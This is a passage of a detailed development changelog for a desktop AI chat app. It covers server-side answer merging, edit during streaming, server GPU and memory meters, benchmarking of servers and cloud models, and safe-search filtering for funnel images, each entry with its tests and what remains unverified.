Tests: the capture path in node on stubs of getUserMedia, AudioContext,
timers and the API (26 scenarios, the old 6b338 glue ones included), 33
mutations each of which must break the scenario aimed at it: capture
before the voice check answers, no status call when cached, the
constraints, one AudioContext, warm reuse and its 15 s, closing on
timer / blur / new chat / pagehide, the setting off, nothing recorded
while warm, a new recording starting empty, no cut of a recording or a
start, "listening" only after the first chunk, the trace marks, the 503,
and the failed starts. The 6b338 hold/tap scenarios run unchanged.

## 6b344 — Thinking and Pro write the merge on your server too
Patrick (2026-10-01), with a screenshot of a Thinking answer whose chip said
"Thinking · Ollama1 ×3": "it's still using my laptop's GPU here for
compositing answers, it looks like, versus the server when it is available."
**This supersedes what 6b339 did and said about the merge** (its compositor
paragraph, and its "not covered on purpose" report line: "Thinking and Pro may
still merge on this Mac's compositor; the merge only moves to the server if the
server has that merger model"). With his
server-first ruling that was wrong: the three drafts ran on the server and the
one model that wrote the final answer didn't.
- **The rule** (`run_council(..., srv_merge=True)`, passed by the handler for a
  mode only: `tier in TIERS and not cloud_only`; never for an Advanced council,
  a pick, "<name> Only" or Cloud Only). When a server qualifies, the model that
  writes the merge is `server_compositor(ctx, drafted)`: the same chooser and
  filters as the seats (`server_mode_candidates`: a paired server of THIS
  profile, the switch on, answering, "gpu" placement, fitting a card whose size
  is reported; `srv_role_ok(..., "compose")`: no coder, embedding, guard, picture
  reader or reasoning distill), the strongest by size, then measured speed.
  Because a compositor is ranked by the seats' own rules, a server merge implies
  at least one server seat in the council, so the title, memory pass and pins
  (the 6b339 server-turn rules: `_seat_fb` non-empty) already follow the server.
- **Resident first.** A model the council just drafted with is already loaded
  on the server, and a 16 GB card holds two models (`OLLAMA_MAX_LOADED_MODELS`
  is 2): a merge on a third would swap one out and pay a load before its first
  word. So the last two server drafters (or a row the server says is loaded)
  take the pen when one is within 70% of the strongest model's size; a much
  smaller one doesn't write the answer for the sake of a load (the strongest
  then writes it, and pays the load).
- **Order, unchanged.** A cloud compositor (cloud power on, keys) still comes
  first: the server merge is only the "local" choice at the end of the ladder.
  A pen named in Advanced stays as named. With no server paired, the switch
  off, or nothing that qualifies, `server_compositor` says none and the code
  path is the one that ran before (a test compares the merge stage's calls,
  text, status lines and frames with `srv_merge` off, and they are identical).
  The older "server has this computer's merger model" copy (6b339) still serves
  an Advanced council.
- **Same rules as a draft.** The merge runs inside the mode's first-word
  deadline (`server_first_deadline`, 60 s) and a failure marks the server down
  (`server_mark_down`). Before its first word a failure falls to this computer's
  compositor (the 6b339 fallback pen), or to the best single draft when the mode
  has none, said in the status line ("<name> didn't write the merge, so <pen>
  writes it here"); no other server and no cloud is tried. After the first
  word there is ONE answer, cut there and said ("\n\n⚠️ ..."), never a second
  one printed over it and never a RESET. The merge prompt is the same one as
  before: the question and the drafts' text, nothing else.
- **What the card and the badge say.** The progress card gets the line the other
  single-model paths give ("Writing the answer", then "Answer written", with
  the model in the detail: "Ollama1 · gpt-oss:20b"); a fallback names the pen
  that wrote it. A RUN frame `{"w": "mix", "m": <models that ran>}` makes the
  badge name where the answer was written: the server's name when it wrote
  everything, "this Mac + Ollama1" when the merge fell back. No new thread-local
  and no new per-profile container: the choice reads the thread's own profile
  (`bound_ctx()`), nothing about a server (URL, key, token) is written anywhere.
- **Tests.** In process: the chooser (families, strongest, resident, the
  70% rule, "the server says it holds one", none for no server, the switch off,
  down, only gpu+ram, no card figure), the merge (on the server and its deadline,
  the card and badge frames, no server as before, an Advanced council untouched,
  a named pen, the cloud first, a refusal before the first word with and without
  a pen of this computer's, a cut after one) and 16 mutations. Live, in the
  page's own request shape against the real gateway on its stub Ollama and the
  `local-record` hook: Thinking and Pro send the merge request to the server, on
  a model it already holds, and NOTHING runs on this computer (Thinking: no local
  call at all); the switch off sends the merge nowhere near the server; a merge
  the stub refuses (`/failmerge`) falls back, said, with the frames; the handler
  mutation (no `srv_merge`) is run against a mutated copy of the app and fails
  those checks. The hook now notes whether a local call is a merge.
- **Not verified here.** Nothing was looked at on screen. Patrick's screenshot
  said "Writing the answer — Qwen 3.5 Vision 9B": that line is written ONLY by
  the single-model paths (a server pick, a mode's Fast seat, the handler's local
  path), never by a council's merge, and Qwen 3.5 Vision 9B is what a picture
  sent in a mode is handed to (the vision takeover, 6b339: a mode's server seat
  doesn't read pictures). So that turn may have carried an image, in which case
  this change does not touch it; a mode's picture still goes to the vision ladder,
  not a server model. Left as it is, to be decided. Not measured: a real card's
  swap time with a merge on a model it doesn't hold.

## 6b343 — Edit & resend works while an answer is being written
Patrick (2026-10-01), with a screenshot of a question mid-answer ("Searched
the web, Consulting models 3 of 3") and its edit icon: "the edit icon
doesn't work unless that's because the request already started. If that's
the case, it should hide the edit button if it's not going to work.
Otherwise, let's fix it so that it can be edited."

It was the request already running: `editResend` began with
`if(generating)return;`, so the button did nothing, silently. It now works:
- Pressed mid-answer, it stops the answer exactly as Stop does
  (`abortCtl.abort()`), remembers the edit in `pendingEdit`, and returns.
- `send()` finishes as it always does after a Stop: the partial answer is
  kept and saved (`syncChat`). Only then, at the very end, the pending edit
  opens: the chat is rewound to that question, its text is in the composer,
  and the saved chat rewinds when the edited question is sent (6b322's
  `chatTrunc`). So the partial answer and the rewind land in order, as
  "Stop then ask" does.
- A new chat drops a waiting edit; an edit is opened only if the same chat
  is still showing.
Independent review found one gap, fixed: `generating` is global, so
editing a question in chat B while chat A's answer streamed on quietly
stopped A's answer and then dropped the edit (the same-chat test at the end
saw a different chat). `genChat` now records the chat whose answer is being
written; the edit only takes this path when it is the chat on screen, and
otherwise does nothing. Known and left: editing a repeated question rewinds
to its first occurrence (older behaviour).
Checked in a real page (Blink) with the answer stubbed to stream slowly:
Edit pressed with "word1 … word5" on screen left `generating` false, the
question in the composer, the chat rewound to 0 and `chatTrunc` set. Not
seen in WKWebView. One gauntlet check pins the flow, with five mutations.

## 6b342 — your server's graphics card in the sidebar meters
Patrick (2026-10-01), with a screenshot of the sidebar's bottom card (a
bar labelled "M4 PRO", then "MEMORY PRESSURE"): "When a server is
connected for the user, can we have this box get bigger and put the GPU
name in a middle row? So in this case, it would have M4 Pro in its GPU
usage. Then in my case, Radeon 6900 XT and its usage, and then memory
pressure. Hopefully this can adjust based on if the server is connected
or not."

FOLLOW-UP, same day, Pat: "add another memory pressure line … server
memory … four bars total". With a server paired the card has four bars:
this computer's chip, the server's card, the server's memory, this
computer's memory pressure. The server's memory row is below.

THEN THE ORDER CHANGED, same day, Pat: "Start with M4 Pro or whatever GPU
the local system has. Then under that, put memory pressure. Then under
that, put the name of the server's GPU and how much load it's under. And
then for the last bar, put server memory usage." So the card reads: this
computer's chip, this computer's memory pressure, then for each server
(two at most) its card row and its memory row. `#srv-meters` is appended
after the memory-pressure row instead of inserted before it, so the
memory row is no longer the last child and keeps its own 7 px gap; the
rule that gave the last server row a gap is gone. A third server still
shows only as "+N more" in the second server's row titles; the "+N
servers more" link that would open a simple dialog with every server's
full details is PARKED by Pat for later (not built). Heights are the
same as before the move (below).

The card (6b254's instrument cluster) keeps its first row (this
computer's chip and its GPU bar) and its last (memory pressure). Each
PAIRED server whose gateway names a card (the same ones that get a chip
beside "MLX", 6b334) adds rows under them (the first order put one between them; see the change below): the card's name set like
"M4 PRO" (`.t-head`, uppercase mono, "NVIDIA "/"AMD "/"INTEL " dropped
from the front, 26 characters then an ellipsis) over a bar that is
the same bar, `paintMeter`, same ease and same hot colour from 80%.

- WHAT THE SERVER SAYS. New signed, paired-only `GET /v1/usage` on the
  gateway (`ollama1/bin/ollama1-gateway`, `Gateway.usage`, reading
  `o1gpu.usage`): `{"gpu": {"busy_pct", "vram_used_bytes",
  "vram_total_bytes"}, "ram": {"used_bytes", "total_bytes"}}`, each an
  int or null, and nothing else (`ram`: MemTotal minus MemAvailable from
  /proc/meminfo, `o1stats.ram_usage`, so the file cache isn't "in use";
  MemFree is not used; a used figure above the total is null; a kit from
  before `ram` leaves it out and the app reads that as not reported): which
  models are loaded, who is using the card, prompts, device ids and
  request counts are not in it (the gateway builds the answer from those
  keys, whatever the reader returns). AMD: `gpu_busy_percent`,
  `mem_info_vram_used` and `mem_info_vram_total`, the files the server's
  own dashboard (`o1stats.gpu`) reads; NVIDIA: `nvidia-smi
  --query-gpu=utilization.gpu,memory.used,memory.total`; Intel or no
  card: all null. A missing file, a value out of range or a missing
  `nvidia-smi` is null, not an error. Read at most once a second however
  many devices ask (one reading at a time, behind a lock), and the
  gateway's existing sixteen-at-once cap and signature checks apply as to
  every route. `/v1/info` is unchanged (the protocol vectors are
  byte for byte the same). PROTOCOL.md and docs/your-own-server.md say it.
  SANDBOX: the gateway already reads `/sys/class/drm/*/device` for the
  card's name and size under `ProtectKernelTunables=yes` and
  `PrivateDevices=yes`, and those three amdgpu files sit beside
  `mem_info_vram_total`, so nothing in the unit needed to change for AMD.
  NOT checked on the real server: that `o1gw` can read them (they are
  world-readable, 0444, on the amdgpu driver I know of), nor NVIDIA:
  `PrivateDevices=yes` hides `/dev/nvidia*` from `nvidia-smi`, which
  would also have hit the card detection that has always used it. An
  NVIDIA server's row may therefore show its name with an empty bar.
- WHAT THE APP DOES. `GET /api/servers/usage?id=<server id>` (behind the
  launch key and the token like every /api route, and the profile
  header): `server_usage` finds the server in the ACTIVE profile (another
  profile's id reads nothing), and makes one short signed `/v1/usage`
  call (`SRV_USAGE_S`, 3 s): `{ok, gpu}`. ok false: no answer, or not
  paired. ok with gpu null: the gateway answered 404 not_found, an older
  kit. While a benchmark runs it answers `{ok, paused}` and asks nothing.
  It loads no model, creates no chat traffic and keeps nothing; the reply
  is the three numbers, nothing secret.
- WHAT THE PAGE DOES. The rows are made by script (`srvMetersSync`,
  `#srv-meters`, after memory pressure), so with no
  server the card's markup is exactly what it was (a gauntlet pin on the
  markup and on the served page). It runs only while a server is paired,
  the card is on screen (`srvCardShown`: the narrow drawer shut is not)
  and the window is showing: every ~3 s per server, 10 s after one
  miss, then 30 s while it doesn't answer, back to 3 s when it does.
  A hidden window clears the timer and sets none. Up to TWO servers get
  rows (two each, so six bars at most and a card of 198.5 px; it was
  three servers while there was one row each), the second's titles
  ending "+N more"; only those are polled. MEMORY ROW: under each
  server's card row, "DESK MEMORY" (the server's name, 17 characters then
  an ellipsis, plus " MEMORY"), the same bar at used/total, its title
  "Desk · memory · 22 of 62 GB in use" (the GPU row's value is the bar and
  "37% busy" in its title; this one's is the GB); dimmed and "not
  answering" with its card row; "usage not reported (update the server
  kit)" and an empty bar when the gateway has no `ram` (an older kit) or
  nulls. Same endpoint and same poll (`/api/servers/usage` returns `ram`
  beside `gpu`): no extra request. A
  row's bar is kept between readings, so it eases rather than
  redrawing. A server that doesn't answer is dimmed (opacity .45, like
  the chips) with an empty bar and "not answering" in its title; an
  older kit (or nulls) shows the name, an empty bar and "usage not
  reported (update the server kit)"; the title otherwise reads
  "<server> · <card> · 16 GB · 37% busy". The rows appear, go and
  change as servers are paired, tested or removed (`paintSrvChips` is
  the one place that redraws the chips and the rows, so every path that
  already repainted the chips moves them) with no reload. A 409 from the
  profile header (the profile changed under the page; a reload follows)
  removes the rows at once and stops the poll; a page only ever knows its
  own profile's `srvList`.
- LAYOUT (browser pane, Blink, 1320x860, the default window; the app's
  own WKWebView is not checked). The card is 76.5 px tall with no server,
  137.5 with one and 198.5 with two (a third is not shown): 30.5 px a row, two rows a server (the
  name's line, its 7 px, the 2 px bar, the 7 px between rows). The
  padding is the same at every count: 10 px from the card's top to the
  chip row's line box and 13 px from the last bar to the bottom (the 9
  and 12 of the CSS plus the 1 px border), 13 px each side; the chat
  list takes the difference (644, 583, 522 px) and neither the
  sidebar nor the page scrolls at any count. With the servers gone it is
  76.5 again.
- Gauntlet: new `== your server's graphics card in the sidebar meters
  (6b342) ==`: the card's markup pinned (source and served page), the
  app's read in process (three numbers kept, an older kit, a refusal, a
  server that's off, an unpaired one, the 3 s limit, the handler's order),
  the rows, the card's DOM and the scheduler in node on a stand-in
  document, clock and timers (steady 3 s; 10 s, 30 s, 30 s then 3 s; a
  thrown fetch; hidden; the card out of sight; a benchmark; a 409; no
  server; two servers on their own schedules; a fourth never read), and
  thirty-five mutations each caught (client ones re-run alone after the
  memory row); live on the REAL gateway (a signed GET
  and nothing to Ollama, nulls, an older kit's 404, a server that is
  off, a benchmark, bad ids, no key or token, another profile). The stub
  gateway's harness gained `/usage` on its control port. Kit: tests for the
  reader (AMD, NVIDIA, missing files, out-of-range values), the route (three
  fields only, signed, paired, the cache, nulls from a missing sysfs) and
  nine mutations (the memory reading: MemTotal minus MemAvailable and not
  MemFree, nulls, used above total, served at all). One full run on the branch: 635 of 640; the five misses
  were two old node checks that slice the page between `SRV_GPU` and
  `paintSrvChips` (the new code sat in that span: moved after
  `paintEngMenuServers`), a served-page pin that matched the script's own
  `srv-meters`, one mutation the poll check let by (an unpaired server
  polled: a check added) and a duplicate `paintSrvChips` I had left in. All
  fixed; the full run was not repeated after them (the node checks were
  re-run alone).

## 6b341 — benchmark servers and cloud models, and compare
Patrick (2026-10-01): "can the benchmark feature also allow benchmarking
your servers? cloud servers too with a warning that it may incur cost via
api. then allow those benchmarks to be compared".

Settings › Usage › Benchmark (6b331) tests this computer. It now tests one
of three **targets** a run, and Compare puts any stored runs side by side.
- **The test is the same.** `BENCH_TEST` is still `b1`: the passage, the
  task, 256 tokens, seed 42, temperature 0 where the target takes one. The
  gauntlet pins the passage and task by hash, so a change to either has to
  be a new test name. Runs of different tests never compare.
- **One target a run**: "This computer" (6b331, unchanged), one of the
  profile's paired servers, or its cloud models. `POST /api/bench/start`
  takes `{target: "local"}` (the default, so the old body `{}` still
  means this computer), `{target: "server", server: <id>, models: [tags]}`
  or `{target: "cloud", confirm: <id>, understood: true}`. `GET
  /api/bench/targets[?refresh=<server id>]` lists what the profile can
  test (the same read-only check Settings › Your servers makes, when a
  server is named) and `POST /api/bench/cloud-plan` is the cloud's first
  step (below). Nothing starts on its own: a run is a click on Run.

**A server** (`_BenchServer`, the same `_bench_one` flow as an engine here):
- Called through the app's own signed requests: `_srv_send` (Access
  headers, Ed25519 signature, a fresh nonce, the clock-skew retry) and
  `_srv_fail` (the same one-line refusals as a chat to it). It does not use
  `server_stream`: that writes the usage ledger, takes no seed or
  `num_predict`, and drops thinking text. Nothing here is in the ledger.
- Per model: look at `/api/ps` (is it loaded?), load it with an empty
  prompt on `/api/generate` (streamed: Cloudflare ends a plain call over
  100 s; `num_ctx` 4096, which the gateway honours), then the fixed chat
  (`options` temperature 0, seed 42, `num_predict` 256, `num_ctx` 4096).
  `keep_alive` is not sent (the gateway drops it) and nothing is unloaded.
- **Figures.** *Writes*: `eval_count / eval_duration` from Ollama's last
  line, which the gateway relays byte for byte (`relay_stream` writes each
  line it reads), `src` "engine". With a count and no duration the count
  is exact and the time is measured here (`src` "measured"). *Reads*:
  `prompt_eval_count / prompt_eval_duration` from the same line; **not
  measured** when the line carries no duration (the first-token time would
  include the network and the queue, so it is never used for reads).
  *First token*: request sent to first word, **measured here**, so it
  includes the network (the row says "incl. network"). *Load*: the
  server's own `load_duration` for a model that was not in memory; **not
  measured** for one that was (the gateway can't unload it for us) and
  when the server reports none. *Memory*: none (this computer's memory
  says nothing about the server); the row says how much of the model sits
  on the server's card (`/api/ps` after the load) and its placement.
- **The hardware line** is the server's card from `/v1/info` (via the
  check: "Radeon RX 6900 XT · 16 GB"), "graphics card not reported" when it
  says none; the versions are Ollama's.
- **Which models start ticked**: only those `_srv_fits` says fit whole on
  the card (placement `gpu`, and the weights plus the gateway's margin
  within the card's memory, as for "<server> Only"). `gpu+ram` models are
  listed with "It also uses the server's memory, which loads its CPU hard"
  and unticked; so are models whose placement isn't reported and ones that
  may not fit. The pane says the run loads the models on the server and
  stores nothing there.
- **The gateway is unchanged.** Its final line already carries every field
  used here, and PROTOCOL.md already says `prompt_eval_*` stay in answers.

**The cloud** (`_BenchCloud`):
- **The cost warning is a hard gate.** `POST /api/bench/cloud-plan` takes
  the models the person ticked (only models the pane could have offered, at
  most 6, a repeat counts once) and answers the exact list, the calls and
  tokens (about 1,000 in and up to 256 out each), the sentence "This uses
  your API keys and may cost money with your provider. ConcordeAI doesn't
  know your plan or prices." and a one-use confirmation id kept in a
  profile cache (`_bench_confirms`): good 10 minutes, for this profile and
  that list. The dialog lists them and its button stays disabled until "I
  understand this may cost money" is ticked; it resets on every opening and
  nothing is remembered anywhere. `bench_start` refuses a cloud run without
  `understood: true` and a live id, takes the id as the run starts (a second
  run asks again), and calls exactly the models the plan holds. No call is
  made before that, and a refused start sends nothing.
- **No invented prices.** The app holds none today (`BENCH_PRICES` is
  empty), so the dialog says "ConcordeAI holds no prices for these models,
  so it shows no estimate." A model with an entry gets "about $0.0003*" and
  the footnote "* Rough estimate, not a quote."
- **The models offered** are the ones the app uses from each provider with a
  working key: the top two of each role (fast, seat, composite) and the
  picked one, at most 4 a provider, none retired. All unticked.
- **The call** uses the app's own body builders (`_openai_body`,
  `_anthropic_body`) and headers, at `BENCH_MAX_TOKENS`, streamed, role
  "fast" (so the effort the app sends is its low one), temperature 0 where
  the body carries one (not Gemini's, Kimi's or Claude's: the app's own
  bodies omit it), seed 42 on Groq only, `stream_options` for Groq and
  Gemini as the app does. It does not use `cloud_text` or
  `cloud_stream_conf`: they raise the cap to the provider's ceiling, rest
  and fail providers on an error, write the usage ledger and can't be cut.
  A benchmark never touches a provider's state: the gauntlet shows cloud.json
  byte for byte the same after a run, and a pin fails the build if the
  section names a function that rests a provider or writes the ledger.
- **Figures.** *First token*: request sent to the first word (text or
  reasoning), measured here. *Writes*: `(completion tokens - 1) / (last word
  - first word)`, the count from the provider's usage when it sends one
  (Anthropic's `message_delta`, an OpenAI-shaped last chunk; reasoning the
  stream never showed is taken off), else the chunks counted and the row
  says "estimated". *Total*: request sent to the end of the stream. *Reads*,
  *load* and *memory*: none; the row shows "-". Every cloud row says "cloud,
  includes the network" and the pane says these are not hardware speeds.
- **Failures are one fixed line per model**, never the provider's words
  (they can carry part of a key): "the key was rejected", "rate limited",
  "the model isn't available on this key", "the account is out of credit",
  "the provider isn't answering (HTTP 5xx)", "the provider refused the
  request (HTTP 400)", "the provider didn't answer", "it used all 256 tokens
  before writing (it thinks first)", "it answered with nothing". The run
  goes on. Nothing falls back: a failed model is not asked again, not
  asked elsewhere, and does not run on this computer.
- **Keys never leave `cloud.json`.** `bench_cloud_models()` builds the pane's
  list from named fields, the call holds the key in the engine for the call,
  and every text a run keeps goes through `_bench_scrub`, which takes out
  the run's own keys and anything shaped like a key or a bearer token. The
  gauntlet greps the page's replies, the profile's file, the copy's log and
  its whole folder for the canary keys.

**Hold, Stop, profiles.**
- *One thing at a time.* A run of a server or of the cloud refuses chats,
  funnels, a chat on the server's own model (6b334's exemption is only for a
  run of this computer), and every model call, and does not start while an
  answer is being written. `_bench_busy["srv"]` counts chats that use only a
  server's models: a run of this computer ignores it (6b334, as before), a
  run of a server or the cloud waits for it. Nothing queues.
- *Stop* cuts the call in flight in about a second. A connect, a TLS
  handshake or a wait for headers has no socket to shut yet, so the call
  runs on a helper thread that Stop (or the 2-minute limit) walks away from,
  and the abandoned call closes what it opened (`_bench_wait`). Once the
  answer is open its socket is shut from the route's thread, as for the
  local engine; a close-delimited provider stream hands the socket to the
  response, so it is kept when the request goes out (the 6b331 lesson, again
  found by the gauntlet on the cloud's stream).
- *Profiles.* A run of a server or the cloud belongs to the profile that
  started it: its worker runs on that ctx (`ctx_thread(..., ctx=ctx)`), the
  servers and keys it reads are that profile's, `GET /api/bench` shows its
  run and results only to it (B sees `run: null`), and a switch (the old
  ctx's `cancel`) stops it within a second or two, marks the rest "not run"
  and does not save it. A confirmation made in A can't be spent in B.

**Where results live.** This computer's runs stay in `benchmarks.jsonl`
(the machine's, as in 6b331; every profile sees them). A server's or the
cloud's belong to a profile (they name its servers and its providers), so
they are in the profile's own `bench_targets.jsonl`, a personal file
(0600, written only through the ctx, `PERSONAL_NAMES`). Each run has new
fields: `target` ("local", "server", "cloud"), `target_name` (the person's
own name for the server, "Cloud models", "This computer"), `card` (a
server's line), `cost_warning` (the cloud run's confirmation, true); rows add
`provider`, `model`, `network`, `placement`, `total_s`. A row without
`target` (every row before this build) reads as this computer's. Never
stored: a key, an Access token, the device key, an address. And a stored run is
cleaned again on every read (`_bench_clean_run`: only the fields this build
writes, every text scrubbed, an address or login taken out, a row that isn't a
row dropped), so a file from another build or edited by hand can't put a key
or a URL in the pane or in Compare; Compare reads a run with no models, no
time, no hardware or an unknown target as blanks, not an error. **Retention** is
`BENCH_KEEP` (100) for each target (each server by its name, the cloud, this
computer), so a cloud run never pushes out a server's or this computer's
history; the pane says so ("Keeps the last 100 runs for each target…").

**Compare.** "Compare runs" (shown with two or more saved runs) opens a
dialog: tick any stored runs, from any target and date; only runs of the
test of the first one ticked can be ticked together. A table (model, where
it ran and its hardware line, writes, reads, first token, load) and bars for
the four figures (the best one green). The warning "These runs were measured
on different hardware or versions, so the figures compare setups, not just
models." wherever the setups differ. A model that ran in more than one place
is shown side by side with "6.7× faster than This computer" (each against
the slowest of them; an estimated figure is never compared): names are
matched by a key all targets share (`gpt-oss:20b`, `GPT-OSS 20B` and
`openai/gpt-oss-20b` are `gptoss20b`). Cloud rows are flagged "cloud,
includes the network"; a server's first token "includes the network"; a
figure a server didn't give says "not measured", a cloud row's is "-". The
older "Compare with…" (a run against an earlier one on the same machine, with
its % change) still works, now only against a run of the same target.
`bmCompare` is pure and runs in node in the gauntlet.

**The pane.** A target select (hidden until there is a server or a key), a
checklist of the models (the server's with their placement and the note; the
cloud's grouped by provider with a count and the estimate mark), the
hardware line of what is selected, and the dialogs over Settings. Looked at
in the Browser pane (Blink) at the default window size, 1320 x 860: with
nothing but this computer the pane is as it was (the Usage pane doesn't
scroll, 66 px under its last line); with a server and cloud keys and "This
computer" selected the card grows by one row and stays under its limit; a
server's or the cloud's checklist longer than the window scrolls in its own
card (176 px) and the pane scrolls as it did. Esc closes a dialog first.

**Gauntlet.** In process on the real servers and profile sections, a
stand-in Ollama behind real signed calls and a stand-in provider, on a clock
that ticks 25 ms a call so the figures are exact: a server run (the figures,
signed calls, the fixed test, no keep_alive, a load time only for a model
that wasn't loaded, the card, the record), a server's failures (full,
spilled, busy, missing, pairing lost, off) with nothing run anywhere else,
Stop mid-answer and during a load that never answers, the hold both ways, the
confirmation (none, not ticked, forged, another profile's, old, spent, the
cap of 6, the plan's numbers and line), the cloud's figures and requests
(both shapes), its failures (fixed lines, no key echoed, provider state
untouched), Stop mid-answer and before headers, secrets (the page, the
file, the targets), the file (0600, retention per target, torn lines, old
rows local), profile isolation and a switch mid-run, the pane's lists, and
node for compare. Live: the real gateway on its stub Ollama (the figures,
signed calls, a chat refused, Stop, the server off, profile B), and a copy
with the stub provider (the routes behind the confirmation, one call each at
256 tokens, cloud.json untouched, a chat refused, Stop, profile B, no key in
any reply, log or file but cloud.json). 64 mutations of the new code each caught by the check that guards it (the 6b331 and 6b334 mutations still run).
Gauntlet: 655 checks, 26 of them new. Four full runs before the last review fix gave 653/654 each time, the one miss a load-timing check: the profile-switch stream test three times (a real Llama 3.2 3B answer not yet streaming when the profile switched; the same test alone on this branch and on origin/main passed in 13-14 s, 4 of 4 and 3 of 3 once the machine was quiet), and once instead the 6b331 live Stop test (3.08 s against its 3 s limit). The review fix (clean on read, sparse Compare) was checked by the 15 new in-process and node checks and the 17 in-process 6b331 checks, not by a full run.

**Not verified.** The pane in WKWebView (looked at in Blink only). A real
cloud provider (the gauntlet's stand-in speaks the shapes the app already
handles; Gemini's and Kimi's streams were not exercised, and their usage
counts may count hidden reasoning, which makes writes read high), and a
model that thinks before it writes may use its 256 tokens first (the row
says so). A real Ollama's `load_duration` and `/api/ps` through the real
gateway (the stub reports no load duration; the figure's path is covered by
the in-process stand-in). A run against Patrick's own server. Windows.

## 6b340 — funnel pictures: three across, and always one
Patrick (2026-09-30), with a screenshot of a picture funnel's stage of
six: "For the funnel using images as well, if we can, let's make the
images a little bit bigger. So maybe in this screenshot, it would be
three across. And also if an image isn't returned for any of them, then
keep trying to fetch one because it's kind of useless without them."

The screenshot had four faults. Each card's picture came from ONE text
search and the first og:image of its top three pages, one card after
another:
- FOUR ACROSS, 82 px tall. `.fopts` was `auto-fit, minmax(150px, 1fr)`.
  A picture stage now caps at three a row (`.fopts.pics`, each column at
  least a third of the row less 1 px, never under 180 px unless the row
  is narrower) and four options go 2x2 (`.n4`), not three and one. It
  drops to two, then one, as the window narrows. Two options (`.n2`) stay
  a card's width (the stage is 489 px at most, left-aligned) instead of
  taking half the row each: 240 px cards at 1400, 700 and 560 px
  windows, filling the row only at 420 px, stacked at 360. The picture sits in a
  16:10 box (`.fimg`, `object-fit:cover`), so it grows with the card and
  a late one doesn't move anything. Text stages keep the old grid.
  Measured in the browser pane (Blink) on the served page, six options:
  3+3 at 1400, 1100, 940 and 700 px windows (no sidebar at 700),
  2+2+2 at 800, 560 and 420, one a row at 360; four options 2+2
  down to 420. Nothing wider than the row, no gap at its right edge, and
  a card 237x199 before and after its picture arrived (1320 px). Not
  checked in WKWebView.
- TWO CARDS WITH NO PICTURE. The stage still sends what it found, and a
  card without a picture breathes in place (the 6b253 look, not a
  shimmer) and asks `POST /api/funnel/image {goal, label, exclude}` for
  one: five tries, 1.5 s doubling to a 12 s cap (`fnImgWait`), then a
  quiet tile of the same size. A picture that won't load in the page (a
  hotlink 403 or 404) is caught on the way down (`error` doesn't bubble)
  and replaced the same way, with the failed URL excluded. A new stage, a
  pick, leaving the funnel or the card leaving the page stops all of it.
  If the app has no search package, the route says so and the tile shows
  at once. The stock stage every model failed to write (6b274: "Lowest
  cost", "Best quality") gets no pictures, as before.
- TWO CARDS WITH THE SAME PHOTO. Each stage's cards share one set of
  claimed pictures. Two URLs are the same picture if the address matches
  without its query, or the file name does (a re-hosted copy, or
  WordPress's -800x533 size of it). The ask-again route excludes every
  picture already on the stage.
- AN ADVERT INSTEAD OF A PHOTO. It's a real image search now (`ddgs`'s
  images, Bing first, then DuckDuckGo's), with the label in the goal's
  context (the goal's telling words), then the label alone, then the
  label plus "photo". Every candidate is vetted: https only; no SVG,
  GIF, ICO or BMP; nothing under 400x240; no strip wider than 2.6:1 or
  taller than 1:2; no logo, icon, banner, sprite, badge, clip art,
  vector, chart, diagram, screenshot, generated picture (ChatGPT,
  DALL-E, Midjourney), sponsor, advert, promo, coupon or /ad/ in the
  address; no logo, banner or advert in the title (whole words only, so
  "catalogo", "analogous", "honey-badger", "bannerman-castle",
  "buttonwood" and "Silicon Valley at dusk" pass); nothing from the
  stock libraries (their previews are watermarked), Facebook, Instagram
  or TikTok (they refuse a picture loaded elsewhere), YouTube covers or
  Scribd pages. Then a title that names the option comes first, then a
  landscape shape, then a photo format (a PNG is usually a graphic).
- The whole stage searches at once, within 9 s (the old way was one card
  after another, up to about 10 s each), but never more than two
  searches in flight (a semaphore on the search itself, which waits its
  turn no longer than the stage's or the route's budget), so six cards
  asking again can't trip the search engines' rate limits or starve the
  chat's own web search. Each card's first ask-again is also spread over
  0-2 s. Live, six cards took about 1 s. Results are kept for 5 minutes
  when found, so an ask-again walks on down the same list.
- ADULT PICTURES (review of 6b340, which found the first version had no
  safe search at all). ddgs 9.14.4's Bing images engine ignores its
  `safesearch` argument (its payload has no `adlt`; checked live: "nude"
  returned 35 results through ddgs and none with `adlt=strict` added),
  and ddgs's automatic backend may pick it. Every ddgs text engine that
  honours the argument (Brave, Mojeek, Startpage, Google) answered
  nothing from here, and Bing's and DuckDuckGo's text engines ignore
  it, so the old last resort (the og:image of a page a text search found)
  is gone. The image search is now only Bing through a subclass of
  ddgs's own engine class that adds `adlt=strict` to its request
  (`_fimg_bing`; ddgs offers no supported switch for it), then
  DuckDuckGo's images with `safesearch="on"`. If neither answers, the
  card has no picture. Then a guard of ours: a short list of plain
  words and known adult sites (`_FIMG_ADULT`, `_FIMG_ADULT_HOST`),
  whole words only ("Sussex" and "Essex" pass), refused in a
  picture's address, query, title and host; and no search at all, and no
  asking again (the stage marks the card `img_none`, the route answers
  `none`), when the goal or the option names one. Known limit: this
  is a filter, not a promise. Bing's strict setting and a word list both
  miss things, and the DuckDuckGo leg is only as good as its own setting.
  The search only ever sees the goal and the label.
- HARDENING (re-review of the above):
  - FAIL CLOSED. A ddgs upgrade can cost the pictures, never the filter.
    The strict Bing class refuses any request that doesn't carry
    `adlt=strict` in its params (a ddgs that stops using `build_payload`
    or sends the query another way gets no answer from Bing, not an
    unfiltered one). `backend="duckduckgo"` only runs while
    `ddgs.engines.ENGINES["images"]` still lists `duckduckgo`; if an
    upgrade renames it ddgs would fall back to its automatic choice,
    which includes stock Bing, so the leg is skipped (and an unreadable
    ENGINES counts as not listed).
  - THE SOURCE PAGE. Bing's page URL (and DuckDuckGo's) is vetted like the
    picture's: the adult sites' hosts and the whole-word list over its
    host, path and query. Hosts also find the words run together
    ("hotnude", "freeporn", "best-xxx-pics") by substring, minus the
    ambiguous ones (no "sex": Sussex and Essex are places; no "naked" or
    "escort"; "nude" not before an "l", "porn" not before "ic": a noodle
    shop, Pornic), plus a host label of exactly "sex", and the sites'
    picture servers (phncdn, xhcdn, xhpingcdn, rdtcdn, ypncdn,
    xvideos-cdn...). Paths, queries and titles stay whole-word.
  - DECODING. Addresses are percent-decoded up to three times before
    matching, so "n%2575de" is "nude". A fourth round isn't tried.
    A page URL that won't parse is refused.
  - "escort" left the word list: "Ford Escort" is a goal people have.
  - THE REAL CLASS. One gauntlet check builds the strict subclass over the
    INSTALLED ddgs `BingImages` (no network, `http_client.request`
    stubbed) and asserts `build_payload("q", "us-en", "on", None)` carries
    `adlt=strict`, a request without it is refused and a real `search`
    sends it, with three mutations of the subclass caught. If ddgs can't
